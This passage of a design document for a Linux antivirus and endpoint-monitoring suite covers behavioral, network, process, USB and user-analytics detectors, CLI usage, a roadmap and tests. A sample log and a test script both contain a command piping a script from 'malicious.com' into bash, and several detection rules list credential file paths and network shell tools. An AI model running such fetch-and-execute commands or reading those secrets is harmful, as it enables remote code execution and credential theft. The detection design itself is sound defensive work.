#   1. Review baseline: av-behavior baseline-info
#   2. Enable anomaly detection: av-behavior monitor --use-baseline

# View baseline info
av-behavior baseline-info
# Output:
# 📊 Behavior Baseline Information
# 
# Created: 2025-11-16 00:00:00
# Duration: 7 days
# 
# Normal process patterns:
#   • chrome spawns chrome helper (expected)
#   • apache2 spawns php-fpm (expected)
#   • systemd spawns all services (expected)
# 
# Normal network patterns:
#   • chrome connects to googleapis.com:443 (expected)
#   • apt connects to archive.ubuntu.com:80 (expected)
# 
# Anomalies detected:
#   0 anomalies (all behavior is baseline)

# Monitor with baseline (detect anomalies)
av-behavior monitor --use-baseline /var/lib/winncore/baseline.db
# Now detects deviations from learned baseline

# Compare current behavior to baseline
av-behavior compare --baseline baseline.db --duration 1h
# Output:
# 📊 Baseline Comparison (last 1 hour)
# 
# Deviations from baseline:
#   1. NEW: process "cryptominer" never seen before ⚠️
#   2. UNUSUAL: apache2 spawned bash (only 2% in baseline) ⚠️
#   3. ANOMALY: 100x more file deletions than baseline 🔴
# 
# Recommended actions:
#   • Investigate cryptominer process
#   • Review apache2 logs for compromise
#   • Check for ransomware (high deletion rate)

# Update baseline (add new normal behavior)
av-behavior update-baseline --add-process /usr/local/bin/new-app
# Adds new application to baseline as "normal"

# Generate behavior rules from baseline
av-behavior generate-rules --from-baseline baseline.db --output custom-rules.yaml
# Creates YAML rules that match baseline patterns
```

---

### Component 2.2: av-network (Network Monitor)

**Mission**: Detect malicious network activity at the endpoint

#### Architecture
```
av-network
├── Packet Capture
│   ├── Method: AF_PACKET raw sockets (or eBPF XDP for high performance)
│   ├── Capture: All TCP/UDP connections
│   └── Parse: Extract src/dst IP, port, protocol
│
├── Connection Tracker
│   ├── Track: Active connections per process
│   ├── Duration: Connection start/end times
│   └── Volume: Bytes sent/received
│
├── DNS Monitor
│   ├── Capture: All DNS queries (port 53)
│   ├── Log: Queried domains
│   └── Detect: DNS tunneling, DGA domains
│
├── TLS Inspector
│   ├── Capture: TLS handshakes
│   ├── Extract: Server certificates
│   └── Validate: Against known good/bad certs
│
├── Threat Intelligence
│   ├── Sources: AbuseIPDB, OTX, ThreatFox
│   ├── Update: Daily
│   └── Match: IP/domain against blacklist
│
└── Response Engine
    ├── Block: iptables rules
    ├── Sinkhole: DNS redirect to 127.0.0.1
    └── Isolate: Disable network interface
```

#### Detection Patterns

**1. Port Scanning**
```rust
// Detect SYN scan (many connections to different ports)
struct PortScanDetector {
    // Track unique ports per source IP
    connections: HashMap<IpAddr, HashSet<u16>>,
}

impl PortScanDetector {
    fn check(&mut self, src_ip: IpAddr, dst_port: u16, syn: bool) -> bool {
        if !syn {
            return false; // Only care about SYN packets
        }
        
        let ports = self.connections.entry(src_ip).or_insert_with(HashSet::new);
        ports.insert(dst_port);
        
        // If more than 20 unique ports in short time -> port scan
        if ports.len() > 20 {
            alert!("Port scan detected from {}", src_ip);
            return true;
        }
        
        false
    }
}
```

**2. DNS Tunneling**
```rust
// Detect DNS tunneling (unusually long queries, high rate)
struct DnsTunnelingDetector {
    queries: Vec<DnsQuery>,
}

impl DnsTunnelingDetector {
    fn check(&mut self, query: DnsQuery) -> bool {
        // Long subdomain indicates data exfiltration
        if query.name.len() > 100 {
            alert!("Possible DNS tunneling: {}", query.name);
            return true;
        }
        
        // High query rate from single process
        self.queries.push(query);
        self.queries.retain(|q| q.timestamp.elapsed() < Duration::from_secs(60));
        
        if self.queries.len() > 100 {
            alert!("High DNS query rate: {} queries/min", self.queries.len());
            return true;
        }
        
        false
    }
}
```

**3. C2 Beaconing**
```rust
// Detect C2 beaconing (periodic connections to same IP)
struct BeaconDetector {
    connections: HashMap<IpAddr, Vec<Instant>>,
}

impl BeaconDetector {
    fn check(&mut self, dst_ip: IpAddr) -> bool {
        let times = self.connections.entry(dst_ip).or_insert_with(Vec::new);
        times.push(Instant::now());
        
        // Keep last 10 connections
        if times.len() > 10 {
            times.remove(0);
        }
        
        // Check if connections are periodic (within 10% variance)
        if times.len() >= 5 {
            let intervals: Vec<Duration> = times.windows(2)
                .map(|w| w[1].duration_since(w[0]))
                .collect();
            
            let avg = intervals.iter().sum::<Duration>() / intervals.len() as u32;
            let variance = intervals.iter()
                .map(|i| (i.as_secs() as i64 - avg.as_secs() as i64).abs())
                .sum::<i64>() / intervals.len() as i64;
            
            // If variance < 10% of average -> beaconing
            if variance < (avg.as_secs() as i64 / 10) {
                alert!("C2 beacon detected to {}: interval ~{}s", dst_ip, avg.as_secs());
                return true;
            }
        }
        
        false
    }
}
```

**4. Data Exfiltration**
```rust
// Detect large uploads to external IPs
struct ExfiltrationDetector {
    upload_stats: HashMap<IpAddr, u64>, // bytes uploaded per IP
}

impl ExfiltrationDetector {
    fn check(&mut self, dst_ip: IpAddr, bytes: u64) -> bool {
        if dst_ip.is_loopback() || dst_ip.is_private() {
            return false; // Ignore local traffic
        }
        
        let total = self.upload_stats.entry(dst_ip).or_insert(0);
        *total += bytes;
        
        // If > 100 MB uploaded to single external IP -> exfiltration
        if *total > 100 * 1024 * 1024 {
            alert!("Possible data exfiltration to {}: {} MB uploaded", dst_ip, total / (1024 * 1024));
            return true;
        }
        
        false
    }
}
```

#### CLI Commands
```bash
# Start network monitoring
av-network monitor --interface eth0
# Output:
# ✅ Network monitoring started on eth0
# 
# Monitoring:
#   • All TCP/UDP connections
#   • DNS queries (port 53)
#   • TLS handshakes
# 
# Threat intelligence: 234,567 known bad IPs
# 
# [2025-11-16 15:30:45] chrome (PID 1234) → 172.217.14.206:443 (googleapis.com)
# [2025-11-16 15:30:46] firefox (PID 5678) → 151.101.1.69:443 (github.com)
# [2025-11-16 15:30:47] apt (PID 9012) → 91.189.88.152:80 (archive.ubuntu.com)
# [2025-11-16 15:30:48] ⚠️ SUSPICIOUS: unknown (PID 6666) → 192.0.2.1:6667 (IRC server)

# Show active connections
av-network connections
# Output:
# 📡 Active Network Connections
# 
# PID    PROCESS       LOCAL              REMOTE                  STATE      BYTES
# 1234   chrome        192.168.1.100:4432 172.217.14.206:443     ESTABLISHED 1.2 MB
# 5678   firefox       192.168.1.100:5567 151.101.1.69:443       ESTABLISHED 3.4 MB
# 9012   cryptominer   192.168.1.100:8888 203.0.113.5:3333       ESTABLISHED ⚠️ 45 MB
# 
# Total: 3 connections, 49.6 MB transferred

# Show suspicious connections only
av-network connections --suspicious
# Only shows connections that match threat intelligence or detection patterns

# Block IP address
av-network block 203.0.113.5 --duration 1h --reason "crypto mining pool"
# Adds iptables rule to drop all packets to/from this IP

# Unblock IP
av-network unblock 203.0.113.5

# Show blocked IPs
av-network blocked
# Output:
# 🚫 Blocked IP Addresses
# 
# IP              BLOCKED_AT          DURATION  REASON
# 203.0.113.5     2025-11-16 15:31:00 1h        Crypto mining pool
# 198.51.100.42   2025-11-16 14:22:00 24h       C2 server
# 192.0.2.1       2025-11-16 13:15:00 permanent Malicious IRC server

# Update threat intelligence feeds
av-network update-ti
# Output:
# 📥 Updating threat intelligence...
# 
# Sources:
#   • AbuseIPDB: 45,678 malicious IPs
#   • AlienVault OTX: 123,456 indicators
#   • ThreatFox: 12,345 C2 servers
# 
# Total: 181,479 indicators
# 
# ✅ Threat intelligence updated
# Last update: 2025-11-16 15:35:00

# Test detection with simulation
av-network test --simulate port-scan
# Simulates port scanning behavior locally to test detection

# Export connections for SIEM
av-network export --since 1h --output connections.json
# Exports connection log in JSON format for SIEM ingestion
```

#### Training Loop: Network Baseline
```bash
# Learn normal network behavior
av-network learn --duration 7d --output network-baseline.db
# Records all normal network connections for 7 days

# Detect network anomalies
av-network detect-anomalies --baseline network-baseline.db
# Output:
# 🔍 Network Anomaly Detection
# 
# Using baseline: network-baseline.db (7 days)
# 
# Anomalies detected:
#   1. NEW DESTINATION: 203.0.113.5:3333 (never seen in baseline) ⚠️
#   2. HIGH UPLOAD: 100 MB to 198.51.100.42 (baseline avg: 5 MB) 🔴
#   3. UNUSUAL PORT: Connection to port 31337 (not in baseline) ⚠️
# 
# Recommended actions:
#   • Investigate processes connecting to 203.0.113.5
#   • Review large upload to 198.51.100.42
#   • Check process using port 31337

# Show top network talkers
av-network top-talkers --baseline network-baseline.db --anomalies-only
# Shows processes with unusual network activity compared to baseline
```

---

### Component 2.3: av-process (Process Monitor)

**Mission**: Track process genealogy and detect suspicious behavior

#### Architecture
```
av-process
├── Process Tree Tracker
│   ├── Track: Parent-child relationships
│   ├── Store: Full process tree in memory
│   └── Persist: SQLite for historical analysis
│
├── Command Line Monitor
│   ├── Capture: Full command line + args
│   ├── Detect: Suspicious patterns
│   └── Alert: On known malicious commands
│
├── Memory Monitor
│   ├── Detect: Shellcode injection
│   ├── Detect: Process hollowing
│   └── Detect: Memory manipulation
│
└── Response Engine
    ├── Kill: Process and children
    ├── Suspend: For investigation
    └── Dump: Memory for forensics
```

#### Suspicious Process Patterns

**1. Web Shell Detection**
```yaml
name: web_shell_detection
description: Web server spawning shell/interpreter
pattern:
  parent: "apache2|nginx|httpd|php-fpm|tomcat"
  child: "bash|sh|zsh|python|perl|ruby|php"
  cmdline_contains: "curl|wget|nc|/bin/sh|chmod"
score: 0.95
action: kill_process
```

**2. Process Injection**
```yaml
name: process_injection
description: ptrace syscall to inject code
pattern:
  syscall: ptrace
  target_pid: "!= self"
score: 0.90
action: kill_process
```

**3. Suspicious Execution Chain**
```yaml
name: office_macro_execution
description: Office app spawning shell/downloader
pattern:
  parent: "libreoffice|soffice|openoffice"
  child: "bash|python|curl|wget|powershell"
score: 0.88
action: kill_process_tree
```

**4. Credential Theft**
```yaml
name: credential_harvesting
description: Reading SSH keys, passwords, tokens
pattern:
  syscall: openat
  path: "~/.ssh/id_rsa|~/.gnupg|/etc/shadow|~/.aws/credentials"
  uid: "!= 0"  # Non-root trying to read sensitive files
score: 0.95
action: kill_process
```

#### CLI Commands
```bash
# Show live process tree
av-process tree
# Output (ASCII tree):
# systemd (1)
#  ├─ sshd (1234)
#  │   └─ sshd (5678) [user session]
#  │       └─ bash (9012)
#  ├─ apache2 (2345)
#  │   ├─ apache2 (3456)
#  │   └─ apache2 (4567)
#  │       └─ bash (5678) ⚠️ SUSPICIOUS: web shell
#  └─ systemd (6789) [user]
#      └─ gnome-shell (7890)

# Show specific process tree
av-process tree 5678
# Shows tree starting from PID 5678

# Monitor new processes (live view)
av-process watch
# Output:
# 🔍 Monitoring process creation...
# 
# [15:45:23] ✅ chrome (12345) spawned chrome helper (12346)
# [15:45:24] ✅ apt (12347) spawned dpkg (12348)
# [15:45:25] ⚠️  apache2 (2345) spawned bash (12349) - SUSPICIOUS
# [15:45:26] 🔴 bash (12349) spawned curl (12350) - MALICIOUS

# Show process info
av-process info 12349
# Output:
# 📋 Process Information
# 
# PID: 12349
# PPID: 2345 (apache2)
# UID: 33 (www-data)
# Command: /bin/bash -c "curl http://malicious.com/shell.sh | bash"
# Created: 2025-11-16 15:45:25
# 
# ⚠️  SUSPICIOUS INDICATORS:
#   • Web server spawned shell
#   • Command line contains curl + pipe to bash
#   • Network connection to malicious.com
# 
# 🔴 THREAT SCORE: 0.97 (CRITICAL)
# 
# Recommended action: Kill process immediately

# Kill process and all children
av-process kill 12349 --recursive
# Output:
# 💀 Killing process tree for PID 12349...
# 
# Killing:
#   • 12349 (bash)
#   • 12350 (curl)
# 
# ✅ Process tree terminated

# Suspend process (for investigation)
av-process suspend 12349 --reason "investigating web shell"
# Sends SIGSTOP to freeze process

# Resume suspended process
av-process resume 12349

# Dump process memory
av-process dump 12349 --output /tmp/process-12349.dump
# Creates memory dump for forensic analysis

# Analyze process memory for shellcode
av-process analyze-memory 12349
# Output:
# 🔍 Memory Analysis for PID 12349
# 
# Scanning for suspicious patterns...
# 
# ⚠️  SHELLCODE DETECTED:
#   Address: 0x7f1234567000
#   Size: 4096 bytes
#   Pattern: NOP sled + reverse shell
# 
# 🔴 VERDICT: Process contains injected code

# Search for processes by pattern
av-process find --name "crypt|miner|malware"
# Finds all processes with suspicious names

# Show process statistics
av-process stats
# Output:
# 📊 Process Statistics
# 
# Total processes: 234
# Created today: 1,234
# Killed (suspicious): 5
# Suspended: 2
# 
# Suspicious patterns detected:
#   • Web shells: 2
#   • Process injection: 1
#   • Credential theft: 2
```

#### Training Loop: Execution Pattern Learning
```bash
# Learn normal process execution patterns
av-process learn --duration 7d --output process-baseline.db
# Records all process creations and parent-child relationships

# Detect unusual process relationships
av-process detect-anomalies --baseline process-baseline.db
# Output:
# 🔍 Process Anomaly Detection
# 
# Using baseline: process-baseline.db (7 days)
# 
# Unusual process relationships:
#   1. apache2 → bash (never seen in baseline) 🔴
#   2. chrome → python (rare: 0.1% in baseline) ⚠️
#   3. systemd → cryptominer (new executable) ⚠️
# 
# Recommended actions:
#   • Investigate apache2 spawning bash (likely web shell)
#   • Review chrome spawning python (malicious extension?)
#   • Check cryptominer process (unauthorized mining)

# Generate whitelist from baseline
av-process generate-whitelist --from-baseline process-baseline.db --output whitelist.txt
# Creates list of known-good parent-child relationships

# Use whitelist for monitoring
av-process monitor --whitelist whitelist.txt --alert-on-deviation
# Only alerts on process relationships not in whitelist
```

---

## 🕵️ NON-CODE ATTACK VECTORS

### Physical & Social Engineering Detection

---

### Component 2.4: av-physical (USB/Hardware Monitor)

**Mission**: Detect physical security threats

#### USB Device Monitoring
```bash
# Monitor USB device insertion
av-physical monitor-usb
# Output:
# 🔌 Monitoring USB devices...
# 
# [15:50:12] USB device inserted:
#   Vendor: SanDisk
#   Product: Ultra USB 3.0
#   Serial: 0123456789ABCDEF
#   Type: Mass Storage
#   Mount point: /media/user/USB_DRIVE
# 
# ✅ Device allowed (in whitelist)

# Block unauthorized USB devices
av-physical block-usb --whitelist /etc/winncore/usb-whitelist.txt
# Only allows USB devices in whitelist file

# Alert on USB keyboard (BadUSB attack)
av-physical alert-on keyboard --notify admin
# Sends alert when USB keyboard is connected (potential HID attack)

# Eject suspicious USB device
av-physical eject /dev/sdb --reason "BadUSB detected"
```

**USB Whitelist Format** (`/etc/winncore/usb-whitelist.txt`):
```
# Vendor ID:Product ID:Serial (optional)
0781:5583:*  # SanDisk Ultra (any serial)
8564:1000:0123456789ABCDEF  # Specific YubiKey
```

#### Detection Patterns

**BadUSB Attack**:
```rust
// USB mass storage device auto-executing
if device_type == "mass_storage" {
    // Check if autorun file appears quickly
    let autorun_files = [
        "autorun.inf",
        "autorun.exe",
        ".autorun",
        "start.sh",
    ];
    
    for file in autorun_files {
        let path = format!("{}/{}", mount_point, file);
        if Path::new(&path).exists() {
            alert!("Possible BadUSB attack: autorun file detected");
            eject_device(mount_point);
            return;
        }
    }
}
```

**USB Rubber Ducky** (HID keyboard attack):
```rust
// Rapid keypresses from USB keyboard
if device_type == "keyboard" && is_usb {
    let keypresses_per_sec = track_keypress_rate(device_id);
    
    // Human typing is ~5 keys/sec, rubber ducky is ~100 keys/sec
    if keypresses_per_sec > 20 {
        alert!("Possible HID injection attack: {} keys/sec", keypresses_per_sec);
        block_device(device_id);
    }
}
```

---

### Component 2.5: av-user (User Behavior Analytics)

**Mission**: Detect insider threats and compromised accounts

#### Detection Patterns

**1. After-Hours Activity**
```rust
if is_after_hours() && !is_admin(user) {
    let activity = count_file_access(user, time_window: "1h");
    
    if activity > 100 {
        alert!("Suspicious after-hours activity by {}: {} files accessed", user, activity);
    }
}

fn is_after_hours() -> bool {
    let hour = chrono::Local::now().hour();
    hour < 6 || hour > 22  // 10pm - 6am
}
```

**2. Mass File Access (Data Hoarding)**
```rust
let files_accessed = count_file_access(user, time_window: "10m");

if files_accessed > 1000 {
    alert!("Data hoarding detected: {} accessed {} files in 10 minutes", user, files_accessed);
    rate_limit_user(user, duration: "1h");
}
```

**3. Abnormal Login Location**
```rust
let current_ip = get_login_ip(user);
let geoip = geolocate(current_ip);

let baseline_countries = get_baseline_countries(user);

if !baseline_countries.contains(&geoip.country) {
    alert!("Login from unusual location: {} from {} (baseline: {:?})", user, geoip.country, baseline_countries);
    require_2fa(user);
}
```

**4. Privilege Escalation Attempt**
```rust
// User trying to access files they shouldn't
if file_access_denied(user, file) {
    let attempts = count_access_denials(user, time_window: "5m");
    
    if attempts > 10 {
        alert!("Possible privilege escalation: {} had {} access denials in 5 minutes", user, attempts);
        lock_account(user, duration: "30m");
    }
}
```

#### CLI Commands
```bash
# Monitor specific user
av-user monitor alice --realtime
# Output:
# 👤 Monitoring user: alice
# 
# [16:00:15] ✅ Login from 192.168.1.100 (home network)
# [16:00:23] ✅ Opened /home/alice/Documents/report.docx
# [16:05:45] ⚠️  Opened 50 files in /home/shared (unusual)
# [16:10:12] 🔴 Access denied to /etc/shadow (privilege escalation?)

# Show user baseline
av-user baseline alice
# Output:
# 📊 User Baseline: alice
# 
# Account created: 2024-01-15
# Baseline period: 7 days (2025-11-09 to 2025-11-16)
# 
# Normal behavior:
#   • Login times: 8am-6pm (Mon-Fri)
#   • Login locations: 192.168.1.0/24 (home), 10.0.0.0/8 (office)
#   • Files accessed/day: ~200
#   • Directories: /home/alice, /home/shared
# 
# Abnormal indicators (from baseline):
#   • After-hours logins: 0%
#   • Failed access attempts: 2 per month
#   • Privilege escalation: 0

# Detect anomalies
av-user detect-anomalies alice --timeframe 24h
# Output:
# 🔍 Anomaly Detection: alice (last 24 hours)
# 
# Anomalies:
#   1. Accessed 1,200 files (baseline: 200/day) 🔴
#   2. Login at 2:30 AM (outside normal hours) ⚠️
#   3. 15 access denials (baseline: 0) 🔴
# 
# Risk score: 0.87 (HIGH)
# 
# Recommended actions:
#   • Review files accessed by alice
#   • Investigate after-hours login
#   • Check for account compromise

# Restrict user access
av-user restrict alice --reason "suspicious activity" --duration 1h
# Temporarily restricts user's access

# Lock user account
av-user lock alice --reason "potential compromise"
# Locks account until admin unlocks
```

---

## 🧩 MODULAR CLI ARCHITECTURE

### Design Principles

Every CLI tool in WinnCoreAV follows these principles:

#### 1. Single Responsibility
Each tool does ONE thing well:
- `av-daemon`: File monitoring and scanning
- `av-behavior`: Behavioral analysis
- `av-network`: Network monitoring
- `av-process`: Process tracking
- `av-quarantine`: File isolation

#### 2. Composability (Unix Philosophy)
Tools can be chained via pipes and JSON:
```bash
# Example: Find suspicious processes and check network connections
av-behavior watch --filter suspicious --output json | \
  jq '.pid' | \
  xargs -I {} av-network connections --pid {}
```

#### 3. Consistent Interface
All tools share common command structure:
```bash
av-<component> <verb> [options]

# Examples:
av-scan scan /path
av-behavior monitor
av-quarantine list
av-network block <ip>
```

#### 4. Standardized Options
Common options across all tools:
```
--verbose, -v     : Detailed output
--quiet, -q       : Suppress output
--output <format> : json|text|csv|yaml
--config <file>   : Custom config file
--dry-run         : Simulate without action
--help, -h        : Show help
--version, -V     : Show version
```

#### 5. Machine-Readable Output
Every tool supports JSON output for scripting:
```bash
av-scan /tmp --output json
# {
#   "scan_id": "...",
#   "files_scanned": 1234,
#   "threats_found": 2,
#   "threats": [...]
# }
```

#### 6. Training Capability
Each tool can learn and improve:
```bash
av-<component> learn --duration 7d --output baseline.db
av-<component> detect-anomalies --baseline baseline.db
av-<component> update-model --with-corrections
```

#### 7. Testing Mode
Simulate attacks for validation:
```bash
av-behavior test --simulate ransomware
av-network test --simulate port-scan
av-process test --simulate web-shell
```

---

### Tool Chaining Examples

**1. Find and kill crypto miners**:
```bash
# Find processes with high CPU + network to mining pools
av-behavior watch --filter "cpu_usage > 80%" --output json | \
  jq '.pid' | \
  xargs -I {} av-network connections --pid {} --filter "port in [3333, 9999]" --output json | \
  jq '.pid' | \
  xargs -I {} av-process kill {} --recursive
```

**2. Identify data exfiltration**:
```bash
# Find processes uploading >100MB to external IPs
av-network connections --upload-min 100MB --external-only --output json | \
  jq '.pid' | \
  xargs -I {} av-process info {} --output json | \
  jq -r '.exe_path' | \
  xargs -I {} av-scan {} --output json
```

**3. Hunt for web shells**:
```bash
# Find apache2 processes that spawned shells
av-behavior watch --filter "parent=apache2 AND child=bash" --output json | \
  jq '.pid' | \
  xargs -I {} av-process tree {} --output json | \
  jq -r '.command_line' >> web-shell-analysis.txt
```

---

## 📅 IMPLEMENTATION ROADMAP

### Priority Matrix

| Component | Priority | Effort | Impact | Timeline |
|-----------|----------|--------|--------|----------|
| **Mission 1.1**: Scan Deduplication | CRITICAL | 4 hours | High | Week 1 |
| **Mission 1.2**: systemd Service | HIGH | 8 hours | High | Week 1 |
| **Mission 1.3**: Auto-Response | HIGH | 16 hours | High | Week 2 |
| **Component 2.1**: av-behavior (Basic eBPF) | HIGH | 40 hours | Critical | Week 3-4 |
| **Component 2.3**: av-process | HIGH | 24 hours | High | Week 5 |
| **Component 2.2**: av-network | MEDIUM | 32 hours | Medium | Week 6-7 |
| **Component 2.4**: av-physical | LOW | 16 hours | Low | Week 8 |
| **Component 2.5**: av-user | LOW | 24 hours | Low | Week 9 |

### Detailed Timeline

**Week 1: Phase 1 Completion**
- Days 1-2: Mission 1.1 (Deduplication)
- Days 3-4: Mission 1.2 (systemd)
- Day 5: Testing and validation

**Week 2: Auto-Response**
- Days 1-3: Mission 1.3 (Quarantine, kill, network block)
- Days 4-5: Testing with live malware

**Weeks 3-4: Behavioral Monitoring Foundation**
- Week 3: eBPF programs (execve, openat, connect)
- Week 4: Event processing, rule engine, basic detections

**Week 5: Process Monitoring**
- Days 1-2: Process tree tracking
- Days 3-4: Suspicious pattern detection
- Day 5: Web shell detection

**Week 6-7: Network Monitoring**
- Week 6: Connection tracking, DNS monitoring
- Week 7: Threat intelligence, C2 detection

**Week 8: Physical Security**
- Days 1-3: USB monitoring
- Days 4-5: HID attack detection

**Week 9: User Analytics**
- Days 1-3: Baseline learning
- Days 4-5: Anomaly detection

---

## 🧪 TESTING & VALIDATION

### Unit Testing

**Rust Unit Tests** (`cargo test`):
```rust
#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    async fn test_scan_deduplication() {
        let dedup = ScanDeduplicator::new(5000);
        
        // First scan should be allowed
        assert!(dedup.should_scan("/tmp/test").await);
        
        // Immediate second scan should be blocked
        assert!(!dedup.should_scan("/tmp/test").await);
        
        // After 5 seconds, should be allowed again
        tokio::time::sleep(Duration::from_secs(6)).await;
        assert!(dedup.should_scan("/tmp/test").await);
    }
    
    #[test]
    fn test_ransomware_detection() {
        let events = vec![
            SyscallEvent { syscall: Syscall::Openat, ... },
            SyscallEvent { syscall: Syscall::Write, ... },
            SyscallEvent { syscall: Syscall::Unlink, ... },
            // ... 100 more events
        ];
        
        let detector = RansomwareDetector::new();
        let score = detector.analyze(&events);
        
        assert!(score > 0.9); // Should detect ransomware
    }
}
```

### Integration Testing

**Attack Simulation Scripts**:
```bash
# tests/test_ransomware_detection.sh
#!/bin/bash

echo "🧪 Testing ransomware detection..."

# Start daemon
winncore-daemon &
DAEMON_PID=$!
sleep 3

# Simulate ransomware (rapid file encryption)
for i in {1..150}; do
    echo "test data" > /tmp/test_$i.txt
    openssl enc -aes-256-cbc -in /tmp/test_$i.txt -out /tmp/test_$i.txt.encrypted -pass pass:test
    rm /tmp/test_$i.txt
done

sleep 5

# Check if daemon detected and killed our process
if journalctl -u winncore-av --since "1 minute ago" | grep -q "RANSOMWARE.*DETECTED"; then
    echo "✅ Ransomware detection working!"
    exit 0
else
    echo "❌ Ransomware NOT detected!"
    exit 1
fi
```
```bash
# tests/test_web_shell_detection.sh
#!/bin/bash

echo "🧪 Testing web shell detection..."

# Simulate apache2 spawning bash (web shell behavior)
# (Run in controlled environment only!)
sudo -u www-data bash -c 'curl http://malicious.com/shell.sh | bash' &
SHELL_PID=$!

sleep 2

# Check if av-behavior killed the process
if ! ps -p $SHELL_PID > /dev/null; then
    echo "✅ Web shell detected and killed!"
    exit 0
else
    echo "❌ Web shell NOT detected!"
    kill $SHELL_PID
    exit 1
fi
```

### Synthetic Attack Generation
```bash
# tests/generate_attack_scenarios.sh
#!/bin/bash

# Generate synthetic malware samples for testing
cd ~/malware-research

# Ransomware simulation
python3 generate_synthetic_malware.py --type ransomware --count 10

# Crypto miner simulation
python3 generate_synthetic_malware.py --type cryptominer --count 10

# Backdoor simulation
python3 generate_synthetic_malware.py --type backdoor --count 10

# Test all samples
for sample in synthetic_malware/*; do
    echo "Testing $sample..."
    av-scan $sample --output json >> test_results.jsonl
done

# Verify detection rate
python3 analyze_results.py test_results.jsonl
# Expected: 100% detection rate
```

### Performance Testing
```bash
# tests/bench_scan_performance.sh
#!/bin/bash

echo "📊 Benchmarking scan performance..."

# Create 10,000 test files
mkdir -p /tmp/bench_test
for i in {1..10000}; do
    dd if=/dev/urandom of=/tmp/bench_test/file_$i bs=1K count=100 2>/dev/null
done

# Benchmark scan
time av-scan /tmp/bench_test --recursive --workers 16 --output json > scan_results.json

# Calculate metrics
DURATION=$(jq '.duration_seconds' scan_results.json)
FILES=$(jq '.files_scanned' scan_results.json)
THROUGHPUT=$(echo "scale=2; $FILES / $DURATION" | bc)

echo "Results:"
echo "  Duration: ${DURATION}s"
echo "  Files: $FILES"
echo "  Throughput: ${THROUGHPUT} files/sec"

# Cleanup
rm -rf /tmp/bench_test

# Verify performance meets target (>100 files/sec)
if (( $(echo "$THROUGHPUT > 100" | bc -l) )); then
    echo "✅ Performance target met!"
else
    echo "❌ Performance below target!"
fi
```

---

## 📚 DOCUMENTATION REQUIREMENTS

Each component must have:

1. **README.md** - Overview, installation, quick start
2. **ARCHITECTURE.md** - Detailed technical design
3. **API.md** - CLI interface documentation
4. **TESTING.md** - Testing procedures
5. **TRAINING.md** - How to train and improve
6. **TROUBLESHOOTING.md** - Common issues and fixes

---

## 🎯 SUCCESS METRICS

### Phase 1 Success Criteria
- ✅ Daemon runs 24/7 without crashes (99.9% uptime)
- ✅ Files scanned exactly once (0% duplicate scans)
- ✅ ML model loaded once per daemon lifetime
- ✅ Memory usage < 100 MB
- ✅ CPU usage < 5% idle, < 20% during scans
- ✅ Detection rate: 100% on known malware
- ✅ False positive rate: < 1%

### Phase 2 Success Criteria
- ✅ Behavioral detections: > 95% on zero-day malware
- ✅ eBPF overhead: < 1% CPU
- ✅ Event processing: > 10,000 events/sec
- ✅ Ransomware detection time: < 5 seconds
- ✅ C2 beacon detection: > 90%
- ✅ Process injection detection: > 95%

---

**END OF PHASE 1 & 2 ARCHITECTURE DOCUMENT**

Last Updated: 2025-11-16  
Next Update: After Phase 1 completion  
Version: 1.0
